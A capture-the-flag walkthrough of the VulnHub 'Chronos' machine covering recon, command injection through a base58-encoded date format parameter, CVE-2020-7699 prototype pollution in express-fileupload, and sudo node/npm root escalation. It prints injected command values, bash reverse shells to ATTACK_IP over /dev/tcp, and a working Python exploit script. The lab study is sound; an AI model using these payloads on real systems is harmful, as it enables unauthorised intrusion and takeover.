# [Chronos](https://www.vulnhub.com/entry/chronos-1,735/)

First as always, `nmap`

```
# Nmap 7.92 scan initiated Sun Sep 12 14:15:32 2021 as: nmap -vvv -p 22,80,8000 -sCV -oA init 192.168.56.102
Nmap scan report for 192.168.56.102
Host is up, received syn-ack (0.00030s latency).
Scanned at 2021-09-12 14:15:39 +07 for 11s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFF8YjHtqC35Tv6qgLJ0kNRdjbf30IJ3vKLgvfu9i0tKcx3+TpxYz91j2DXQazjyUpfbIV+fQJb5uyl1iaXHcuvLcQ/wx2WzqzYCmvwM0UzChbwlIUxBpCgfx8wRYNJSwGbgPRoHnXLFquLf47q5nugN87esyyMM0UIaMYo3rNspZtB8QsdzZD2m5RqqI45ab8ByrQZbp8PP7XxTUXWT1ulcAABUbWnRR6VJDL72IQy3G8gpDoU95p4feodti3EA97jwbuNq9G+XeLK2BX4Y5SLpqgYazTWw8scw71hPea4r2YvtJNv6aQJBjMTzDfUm1CQ7pc1qN1T+1vujcyzO7J
|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO/PvsX6OqdIiLIzv+JlEolWwqi2s/gnJGADk2W0miSvnZNH2CZ/MAz6qxC4tRLsQl1eI2i43+Wd3tw6pyNvmSg=
|   256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGOQB+a1NPS+fokbiT0hLgpNOYdGG/5+ZVsOoCCn0TyO
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-cors: HEAD GET POST PUT DELETE PATCH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 12 14:15:50 2021 -- 1 IP address (1 host up) scanned in 18.23 seconds
```

Looking at the page on port 80, the source code has some obfuscated javascript. (The code below is just formatted.)

```javascript
var _0x5bdf = [
  "150447srWefj",
  "70lwLrol",
  "1658165LmcNig",
  "open",
  "1260881JUqdKM",
  "10737CrnEEe",
  "2SjTdWC",
  "readyState",
  "responseText",
  "1278676qXleJg",
  "797116soVTES",
  "onreadystatechange",
  "http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL",
  "User-Agent",
  "status",
  "1DYOODT",
  "400909Mbbcfr",
  "Chronos",
  "2QRBPWS",
  "getElementById",
  "innerHTML",
  "date",
];
(function (_0x506b95, _0x817e36) {
  var _0x244260 = _0x432d;
  while (!![]) {
    try {
      var _0x35824b =
        -parseInt(_0x244260(0x7e)) * parseInt(_0x244260(0x90)) +
        parseInt(_0x244260(0x8e)) +
        parseInt(_0x244260(0x7f)) * parseInt(_0x244260(0x83)) +
        -parseInt(_0x244260(0x87)) +
        -parseInt(_0x244260(0x82)) * parseInt(_0x244260(0x8d)) +
        -parseInt(_0x244260(0x88)) +
        parseInt(_0x244260(0x80)) * parseInt(_0x244260(0x84));
      if (_0x35824b === _0x817e36) break;
      else _0x506b95["push"](_0x506b95["shift"]());
    } catch (_0x3fb1dc) {
      _0x506b95["push"](_0x506b95["shift"]());
    }
  }
})(_0x5bdf, 0xcaf1e);
function _0x432d(_0x16bd66, _0x33ffa9) {
  return (
    (_0x432d = function (_0x5bdf82, _0x432dc8) {
      _0x5bdf82 = _0x5bdf82 - 0x7e;
      var _0x4da6e8 = _0x5bdf[_0x5bdf82];
      return _0x4da6e8;
    }),
    _0x432d(_0x16bd66, _0x33ffa9)
  );
}
function loadDoc() {
  var _0x17df92 = _0x432d,
    _0x1cff55 = _0x17df92(0x8f),
    _0x2beb35 = new XMLHttpRequest();
  (_0x2beb35[_0x17df92(0x89)] = function () {
    var _0x146f5d = _0x17df92;
    this[_0x146f5d(0x85)] == 0x4 &&
      this[_0x146f5d(0x8c)] == 0xc8 &&
      (document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)] =
        this[_0x146f5d(0x86)]);
  }),
    _0x2beb35[_0x17df92(0x81)]("GET", _0x17df92(0x8a), !![]),
    _0x2beb35["setRequestHeader"](_0x17df92(0x8b), _0x1cff55),
    _0x2beb35["send"]();
}
```

We see that it's making some requests to `http://chronos.local:8000/` and we can view the requests in the browser's (I'm using firefox) developer tool, though we should first add `chronos.local` to our `/etc/hosts`. Looking at the developer tool, we have 2 requests, of which the OPTIONS request returns nothing, while the GET request returns a string with the time. Analyzing the GET request, besides the URL, the only special part is the User-Agent which is required to be of the value "Chronos", without which we get "Permission Denied" as the response. In the URL, we have the parameter "format" whose value in the javascript is the string `'+Today is %A, %B %d, %Y %H:%M:%S.'` but base58-encoded. This looks like an argument for the linux command `date`, so we can test for command injection.

I set up a listener and sent the following string, base58-encoded, as "format".

```
'+Today is %A, %B %d, %Y %H:%M:%S.'; curl http://ATTACK_IP:8000
```

This got the server to make a connection to my machine so I went on to deliver a reverse shell in place of `curl`.

```
'+Today is %A, %B %d, %Y %H:%M:%S.'; bash -c 'exec bash -i &>/dev/tcp/ATTACK_IP/1337 <&1'
```

This payload, base58-encoded, should get us a shell on the machine.

Checking listening ports and running node processes, we find another Node server listening on port 8080 ran by "imera".

```sh
www-data@chronos:/opt/chronos$ ss -tlnp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         128               127.0.0.1:8080             0.0.0.0:*
LISTEN   0         128                    [::]:22                  [::]:*
LISTEN   0         128                       *:8000                   *:*        users:(("node",pid=946,fd=18))
LISTEN   0         128                       *:80                     *:*

www-data@chronos:/opt/chronos$ curl 127.0.0.1:8080
<!DOCTYPE html>
<html>
    <head>
        <title>Chronos - Version 2</title>
    </head>
    <body>
        <h1>Coming Soon...</h1>
    </body>

www-data@chronos:/opt/chronos$ ps aux | grep node
imera      783  0.0  2.9 599096 38616 ?        Ssl  08:07   0:00 /usr/local/bin/node /opt/chronos-v2/backend/server.js
www-data   946  0.0  2.9 630848 38716 ?        Ssl  08:07   0:00 /usr/local/bin/node /opt/chronos/app.js
www-data  1444  0.0  0.0  13144  1056 pts/0    S+   08:18   0:00 grep node
```

Looking at the server code in `/opt/chronos-v2/backend/server.js` ...

```javascript
const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
   console.log('Server listening on ' + addr + ' port ' + port);
});
```

We see the module `express-fileupload` being used, and can view the exact version in `package.json`.

```json
{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}
```

Looking around, we find that this version of `express-fileupload` has a Code Injection vulnerability [CVE-2020-7699](https://vuldb.com/?id.159175). The related [github issue](https://github.com/richardgirges/express-fileupload/issues/236) leads to [this blog](https://blog.p6.is/Real-World-JS-1/) on the vulnerability. I then looked around for a PoC and found [this article](https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325). I then copied and ran the PoC on the machine to get a reverse shell.

```python
import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i &> /dev/tcp/ATTACK_IP/1337 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://localhost:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://localhost:8080')
print("Finished!")
```

After running the script, we should have a shell as "imera".

Checking our privileges ...

```sh
imera@chronos:/opt/chronos-v2/backend$ sudo -l
sudo -l
Matching Defaults entries for imera on chronos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User imera may run the following commands on chronos:
    (ALL) NOPASSWD: /usr/local/bin/npm *
    (ALL) NOPASSWD: /usr/local/bin/node *
```

We see that we're able to run `npm` and `node` as root without a password. Following GTFObins, we can get a root shell with either command.

```sh
sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

```sh
sudo npm exec /bin/sh
```

After running either of the above commands, we should have a shell as root.
